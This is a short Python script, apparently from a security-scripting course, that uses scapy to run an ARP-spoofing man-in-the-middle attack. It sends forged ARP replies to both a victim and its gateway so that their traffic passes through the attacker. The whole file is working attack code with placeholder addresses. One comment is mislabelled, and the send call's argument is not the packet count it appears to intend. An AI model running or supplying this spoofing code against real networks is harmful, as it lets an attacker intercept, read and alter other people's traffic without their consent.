#!/usr/bin/env python

# Author: SPSE-3232
# Purpose:
# - Create a ARP MITM tool using scapy

from scapy.all import *

victim_ip = "x.x.x.x"
victim_mac = "a1:b2:c3:d4:e5:f6"

gateway_ip = "x.x.x.x"
gateway_mac = "f1:e2:d3:c4:b5:a6"


def arp_poison_client():
    arp_packet = ARP()
    arp_packet.op = 2
    arp_packet.psrc = gateway_ip
    arp_packet.pdst = victim_ip
    arp_packet.hwdst = victim_mac
    # arp_packet.psrc = automatic populated by scapy with our mac
    send(arp_packet, 500)


def arp_poison_gateway():
    arp_packet = ARP()
    arp_packet.op = 2
    arp_packet.psrc = victim_ip
    arp_packet.pdst = gateway_ip
    arp_packet.hwdst = gateway_mac
    # arp_packet.psrc = automatic populated by scapy with our mac
    send(arp_packet, 500)


# 1 - Arp Spoofing
print('Starting ARP spoofing...')
# CLIENT <-----> ATTACKER ......... GATEWAY
arp_poison_client()
# CLIENT ....... ATTACKER <-------> GATEWAY
arp_poison_gateway()
print('Shutting down...')
